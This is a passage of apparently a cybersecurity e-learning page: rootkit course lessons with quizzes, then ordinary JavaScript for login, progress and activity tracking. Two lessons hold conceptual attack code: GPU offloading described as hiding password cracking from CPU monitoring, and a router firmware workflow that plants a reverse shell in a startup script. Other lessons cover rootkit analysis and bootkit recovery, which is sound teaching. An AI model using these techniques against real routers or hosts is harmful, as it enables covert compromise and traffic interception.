                            "title": "GPU Rootkit Implementation (Conceptual CUDA)",
                            "language": "c",
                            "code": "// This is conceptual C++ code using NVIDIA's CUDA framework to offload\n// a password cracking task to the GPU, hiding it from the main CPU.\n\n// --- Code running on the main CPU (the rootkit) ---\n\n// 1. The list of password hashes to crack.\nchar** hashes = get_hashes_from_memory();\nchar* salt = get_salt();\n\n// 2. Allocate memory on the GPU's VRAM.\nchar* gpu_hashes;\ncudaMalloc(&gpu_hashes, size_of_hashes);\n\n// 3. Copy the hashes from system RAM to the GPU's VRAM.\ncudaMemcpy(gpu_hashes, hashes, size_of_hashes, cudaMemcpyHostToDevice);\n\n// 4. Launch the password cracking kernel on the GPU.\n//    This will launch thousands of threads on the GPU, each trying a different password.\nint num_threads_per_block = 1024;\nint num_blocks = (num_passwords + num_threads_per_block - 1) / num_threads_per_block;\npassword_cracker_kernel<<<num_blocks, num_threads_per_block>>>(gpu_hashes, salt);\n\n// 5. The CPU can now go to sleep or perform other tasks. The GPU is doing all the heavy\n//    lifting, and this activity will not be visible in the CPU's process list.\n\n// --- Code running on the GPU (the CUDA kernel) ---\n__global__ void password_cracker_kernel(char** hashes, char* salt) {\n    // Each GPU thread gets a unique ID and tries a different password from a wordlist.\n    int tid = blockIdx.x * blockDim.x + threadIdx.x;\n    char* password_guess = get_password_from_list(tid);\n    // ... (code to hash the guess and compare it to the target hashes) ...\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is a primary advantage for a rootkit to use the GPU for its malicious computations?",
                            "options": [
                                "It is the only way to access the internet.",
                                "It hides the computational activity from the main CPU, so it won't show up in the Task Manager's CPU usage.",
                                "The GPU is easier to program.",
                                "The GPU has more storage than the hard drive."
                            ],
                            "correct": 1,
                            "explanation": "Offloading heavy computational tasks to the GPU is a powerful stealth technique. The user will not see their main CPU spiking to 100%, making the malware's presence much less obvious."
                        },
                        {
                            "id": 2,
                            "question": "A hardware chip on a motherboard that is designed to be a 'root of trust' for storing cryptographic keys and performing integrity measurements is known as a:",
                            "options": [
                                "CPU",
                                "GPU",
                                "RAM",
                                "Trusted Platform Module (TPM)"
                            ],
                            "correct": 3,
                            "explanation": "The TPM is a dedicated security chip. It is the hardware anchor for security features like BitLocker and Secure Boot. Bypassing the TPM is a key goal for the most advanced adversaries."
                        },
                        {
                            "id": 3,
                            "question": "The process where a remote server can cryptographically verify that a client machine's boot process has not been tampered with is known as:",
                            "options": [
                                "Authentication",
                                "Authorization",
                                "Remote Attestation",
                                "Encryption"
                            ],
                            "correct": 2,
                            "explanation": "Remote attestation, often using a TPM, is a powerful defensive feature. It allows a server to verify the integrity of a client before granting it access to the network, which can prevent a compromised machine from connecting."
                        }
                    ]
                }
            },
            {
                "id": "lesson-48",
                "title": "Network Infrastructure Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Perform firmware modification on routers and switches.",
                    "Develop a rootkit for a network appliance.",
                    "Exploit SDN controllers to gain control of the network.",
                    "Manipulate the network protocol stack of an infected device.",
                    "Create a persistent, network-level man-in-the-middle."
                ],
                "content": {
                    "overview": "This lesson focuses on the development of rootkits that target the network infrastructure itself. By compromising a router, switch, or firewall, an attacker can gain a powerful position to monitor, intercept, and manipulate all the traffic that passes through it, making their presence completely invisible to the endpoint hosts.",
                "sections": [
                    {
                        "title": "Router Firmware Rootkits",
                        "content": "<p>A router is just an embedded computer. An attacker who can gain administrative access to a router (often via default credentials) can re-flash it with a modified, malicious firmware image.</p><h3>Capabilities of a Router Rootkit:</h3><ul><li><strong>Passive Sniffing:</strong> Can copy all traffic passing through the router to a hidden location for later analysis.</li><li><strong>Active MITM:</strong> Can actively manipulate traffic on-the-fly, such as downgrading HTTPS connections to HTTP or injecting malicious code into unencrypted downloads.</li><li><strong>Resilient C&C:</strong> The compromised router can act as an internal C&C server for other malware on the network.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Switch and Hub Exploitation",
                            "content": "<p>Compromising a network switch can allow an attacker to bypass network segmentation.</p><p><strong>Real-world Example:</strong> An attacker gains control of a managed switch. They can then reconfigure the switch's VLAN assignments. They can move a port that is supposed to be in the low-security 'Guest' VLAN into the high-security 'Server' VLAN, completely bypassing the firewall that was supposed to separate them. This is a powerful lateral movement and privilege escalation technique at the network layer.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "SDN Controller Rootkits",
                            "content": "<p>As discussed, the Software-Defined Network (SDN) controller is the centralized brain of a modern network. A rootkit on the SDN controller is the ultimate network-based threat.</p><p>By compromising the controller, an attacker has complete, programmatic control over the entire network fabric. They can create new network flows to silently redirect traffic to a sniffing device, drop traffic from security sensors, and create new rules to allow their C&C traffic, all via the controller's legitimate API. The compromise is extremely powerful and very difficult to detect from the endpoint devices' perspective.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Router Firmware Modification (Conceptual)",
                            "language": "bash",
                            "code": "# This is a conceptual workflow for creating a malicious router firmware.\n\n# 1. Download the official firmware for the target router from the vendor's website.\nwget http://vendor.com/firmware-v1.2.bin\n\n# 2. Use 'binwalk' to unpack the firmware's file system.\nbinwalk -e firmware-v1.2.bin\n\n# 3. Go into the extracted file system.\ncd _firmware-v1.2.bin/squashfs-root\n\n# 4. Add the malicious payload.\n#    For example, copy a reverse shell binary into /bin.\n#    Then, modify a startup script (e.g., /etc/init.d/rcS) to launch the reverse shell.\necho \"/bin/reverse_shell &\" >> etc/init.d/rcS\n\n# 5. Use the vendor's specific firmware tools to re-pack the modified file system\n#    into a valid, flashable firmware image.\n# create_firmware -o malicious_firmware.bin .\n\n# 6. The attacker can now flash this malicious firmware to the router via its web interface\n#    (if they have the admin password) or via a physical connection."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary goal of an attacker who installs a rootkit on a network router?",
                            "options": [
                                "To make the internet faster.",
                                "To gain a persistent man-in-the-middle position to intercept, monitor, and manipulate all traffic that passes through the router.",
                                "To change the Wi-Fi password.",
                                "To block access to social media."
                            ],
                            "correct": 1,
                            "explanation": "A compromised router is the ultimate network vantage point. It allows an attacker to be completely invisible to the endpoint hosts, as they can inspect and alter traffic at a layer below the host operating systems."
                        },
                        {
                            "id": 2,
                            "question": "An attacker who has compromised a managed switch can bypass network segmentation by doing what?",
                            "options": [
                                "By unplugging the switch.",
                                "By reconfiguring the VLAN assignments to move a port from a low-security VLAN to a high-security VLAN.",
                                "By changing the switch's admin password.",
                                "By installing antivirus on the switch."
                            ],
                            "correct": 1,
                            "explanation": "VLANs are a logical construct configured on the switch. An attacker with administrative control of the switch can simply change these configurations, completely undermining the intended network segmentation."
                        },
                        {
                            "id": 3,
                            "question": "In a Software-Defined Network (SDN), a rootkit on which component would be the most powerful and devastating?",
                            "options": [
                                "An individual workstation.",
                                "A physical switch.",
                                "The SDN controller.",
                                "The network cabling."
                            ],
                            "correct": 2,
                            "explanation": "The SDN controller is the centralized brain of the entire network. A compromise of the controller gives an attacker complete, programmatic control over the data plane, allowing them to redirect, intercept, and manipulate any and all traffic."
                        }
                    ]
                }
            },
            {
                "id": "lesson-49",
                "title": "Rootkit Analysis Methodologies",
                "duration": "100 min",
                "objectives": [
                    "Apply advanced static analysis techniques to reverse engineer rootkits.",
                    "Use specialized dynamic analysis environments to safely analyze rootkit behavior.",
                    "Develop hybrid analysis approaches that combine static and dynamic methods.",
                    "Use machine learning to automate the classification of rootkits.",
                    "Generate high-fidelity signatures for rootkit detection."
                ],
                "content": {
                    "overview": "This lesson focuses on the advanced defensive methodologies for analyzing the rootkits we've been studying. We will explore how to combine static and dynamic analysis, how to use machine learning for classification, and how to create the high-fidelity signatures needed to detect these stealthy threats in the wild.",
                "sections": [
                    {
                        "title": "Advanced Static Analysis",
                        "content": "<p>Reverse engineering a kernel driver requires a deep understanding of OS internals and assembly language. The researcher must be able to identify the key functions of the rootkit:</p><ul><li><strong>`DriverEntry`:</strong> The main function of a Windows driver, where initialization and hooking often occur.</li><li><strong>Dispatch Routines:</strong> The functions that handle specific I/O requests (IRPs).</li><li><strong>The Hooks Themselves:</strong> The code that is injected or used to overwrite legitimate pointers.</li></ul><p>Tools like IDA Pro and Ghidra, combined with a kernel debugger like WinDbg, are essential for this deep static analysis.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Dynamic Analysis Environments",
                            "content": "<p>Safely running and analyzing a kernel-mode rootkit requires a specialized dynamic analysis environment.</p><p><strong>Real-world Example: Kernel Debugging.</strong> A researcher needs to analyze a new rootkit driver. They set up two virtual machines that are connected via a virtual serial port. The 'target' VM is where they will load the malicious driver. The 'host' VM is where they will run the kernel debugger (WinDbg). By enabling kernel debugging on the target VM, the researcher on the host can set breakpoints on kernel functions, step through the rootkit's code as it executes in Ring 0, and inspect kernel memory. This is the primary method for dynamic analysis of a kernel-mode rootkit.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Machine Learning for Detection",
                        "content": "<p>Machine learning can be used to detect rootkits by finding anomalous system behavior. An ML model can be trained on a massive baseline of normal kernel activity (e.g., millions of legitimate system calls). It can then monitor a live system and flag any system call patterns that deviate significantly from this learned baseline. This can be effective at detecting the presence of a previously unknown rootkit, even without a specific signature for it.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Automated Unpacking System (Conceptual)",
                            "language": "python",
                            "code": "# This conceptual script outlines the logic for an automated system that uses\n# dynamic analysis to unpack a kernel driver.\n\n# 1. Start a kernel debugging session with a target VM.\n#    (e.g., using the pykd library for scripting WinDbg).\n\n# 2. Set a breakpoint on the kernel function 'MmLoadSystemImage'.\n#    This function is called whenever a new driver is loaded.\n\n# 3. Load the packed, malicious driver into the target VM.\n\n# 4. The breakpoint will be hit. The debugger is now paused at the very beginning of\n#    the driver loading process.\n\n# 5. The automation script now sets another breakpoint. It finds the unpacking stub\n#    in the driver's code and sets a memory-write breakpoint on the driver's main\n#    code section. This will trigger when the unpacker writes the real, decrypted code.\n\n# 6. Resume the target VM.\n\n# 7. The second breakpoint is hit. The unpacker has just finished writing the original code\n#    to memory.\n\n# 8. The automation script can now dump the unpacked driver code from memory to a file\n#    for static analysis."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary tool used for live, dynamic analysis and debugging of the Windows kernel?",
                            "options": [
                                "GDB",
                                "Wireshark",
                                "Volatility",
                                "WinDbg"
                            ],
                            "correct": 3,
                            "explanation": "WinDbg is the powerful, official debugger from Microsoft for the Windows kernel. It is an indispensable tool for both driver development and rootkit reverse engineering."
                        },
                        {
                            "id": 2,
                            "question": "What is the most effective and reliable method for detecting a kernel-mode rootkit?",
                            "options": [
                                "Running a standard antivirus scan from within the infected OS.",
                                "Performing a full memory analysis from an external, trusted environment and using cross-view validation techniques.",
                                "Checking the browser history.",
                                "Rebooting the computer."
                            ],
                            "correct": 1,
                            "explanation": "A rootkit is designed to lie to any software running within the compromised OS. The only way to get a truthful view is to analyze the system from the outside (via a memory dump) and compare what the OS *says* is happening with what the raw kernel structures *actually* show."
                        },
                        {
                            "id": 3,
                            "question": "The main entry point function for a Windows driver, which is called when the driver is loaded, is typically named:",
                            "options": [
                                "`main()`",
                                "`DriverEntry()`",
                                "`DllMain()`",
                                "`start()`"
                            ],
                            "correct": 1,
                            "explanation": "`DriverEntry` is the standard entry point for all Windows kernel drivers. It is the first place a researcher will look when reverse engineering a malicious driver to understand its initialization routine."
                        }
                    ]
                }
            },
            {
                "id": "lesson-50",
                "title": "Bootkit Analysis and Recovery",
                "duration": "100 min",
                "objectives": [
                    "Perform a forensic analysis of the boot sector (MBR) and partition table.",
                    "Analyze a UEFI firmware dump to find modifications.",
                    "Reconstruct the boot process to identify a hijack.",
                    "Develop strategies for removing bootkits and recovering a system.",
                    "Use specialized tools for firmware and boot process analysis."
                ],
                "content": {
                    "overview": "This final lesson focuses on the defensive side of boot-time malware. We will learn how to perform a forensic analysis of the pre-boot environment, how to find the artifacts of a bootkit infection, and the difficult process of removing a threat that has embedded itself at the lowest levels of a system.",
                "sections": [
                    {
                        "title": "Boot Sector and MBR Forensics",
                        "content": "<p>The first step in analyzing a legacy bootkit is to examine the Master Boot Record.</p><h3>The Analysis Process:</h3><ol><li>Acquire a full physical image of the hard drive.</li><li>Use a forensic tool to examine the first sector (the MBR).</li><li>Disassemble the boot code in the MBR.</li><li>Compare the code to a known-good MBR from a clean installation of the same OS. Any differences are highly suspicious.</li><li>Look for signs of a hidden 'backstore', where the bootkit has stored the original MBR.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "UEFI Forensic Analysis",
                            "content": "<p>Analyzing a UEFI bootkit requires an analysis of the firmware and the EFI System Partition (ESP).</p><p><strong>Real-world Example:</strong> An analyst suspects a UEFI bootkit. They use a hardware tool to dump the contents of the motherboard's SPI flash chip, which contains the UEFI firmware. They also take an image of the hard drive and examine the ESP. They find a suspicious, unsigned `.efi` file in the boot directory. They then use a tool like UEFITool to analyze the firmware dump. They find that a legitimate UEFI variable that points to the bootloader has been modified to point to their suspicious `.efi` file first. The analyst now has proof of the boot process hijack. The recovery process would involve re-flashing the motherboard with a clean firmware image from the manufacturer and deleting the malicious file from the ESP.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "System Recovery Techniques",
                            "content": "<p>Removing a sophisticated bootkit can be extremely difficult.</p><h3>Recovery Steps:</h3><ul><li><strong>MBR Bootkit:</strong> Booting from a trusted live CD and using a tool to restore the original MBR from the hidden backstore, or simply writing a new, clean MBR.</li><li><strong>UEFI Bootkit:</strong> This is much harder. The recovery often involves re-flashing the motherboard firmware with a clean version from the manufacturer, which is a risky process that can 'brick' the motherboard if done incorrectly. After re-flashing, the OS must be completely reinstalled.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1544197150-b99a_580bb7a8?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Boot Forensics Tools (Volatility)",
                            "language": "bash",
                            "code": "# While Volatility is a memory forensics tool, it has plugins that can analyze\n# on-disk artifacts that are related to the boot process, if they are mapped in memory.\n\nMEMORY_DUMP=\"bootkit_infected.mem\"\n\n# 1. Analyze the Master Boot Record (MBR) from the memory dump.\n#    The OS often keeps a copy of the MBR in memory.\nvol -f $MEMORY_DUMP windows.mbrscan\n\n# 2. Analyze UEFI configurations.\n#    This experimental plugin can parse UEFI-related data structures found in memory.\n#    This could be used to find hooks in runtime services or manipulated variables.\nvol -f $MEMORY_DUMP windows.uefi.uefiscan\n\n# A full bootkit analysis requires correlating these memory findings with a deep\n# analysis of the on-disk firmware image and EFI System Partition."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "When analyzing a suspected MBR bootkit, what is the first piece of data an analyst should examine?",
                            "options": [
                                "The Windows Registry.",
                                "The first 512-byte sector of the hard drive.",
                                "The browser history.",
                                "The system event log."
                            ],
                            "correct": 1,
                            "explanation": "The MBR is the first sector, and it is where the initial boot code resides on a legacy BIOS system. Analyzing this sector is the first step in any MBR bootkit investigation."
                        },
                        {
                            "id": 2,
                            "question": "What is the most reliable way to remove a UEFI firmware rootkit?",
                            "options": [
                                "Running an antivirus scan.",
                                "Deleting the malicious files from the hard drive.",
                                "Re-flashing the motherboard's firmware with a clean, official version from the manufacturer.",
                                "Rebooting the computer."
                            ],
                            "correct": 2,
                            "explanation": "Because the malware resides on a chip on the motherboard itself, it is immune to changes on the hard drive. The only way to remove it is to completely overwrite the firmware chip with a known-good image."
                        },
                        {
                            "id": 3,
                            "question": "The hidden partition on a modern Windows system that contains the UEFI bootloaders and drivers is known as the:",
                            "options": [
                                "The MBR",
                                "The EFI System Partition (ESP)",
                                "The Windows Recovery Environment (WinRE)",
                                "The page file"
                            ],
                            "correct": 1,
                            "explanation": "The ESP is the standard partition where all the UEFI boot-time components are stored. It is a primary target for a UEFI bootkit to infect, and a primary location for a forensic investigator to analyze."
                        }
                    ]
                }
            }
        ]
    };

      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
        timeStarted: null,
        timeCompleted: null,
        currentQuestionIndex: 0,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        lastActive: new Date(),
        interactions: 0,
        completedSections: [],
        totalTime: 0,
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
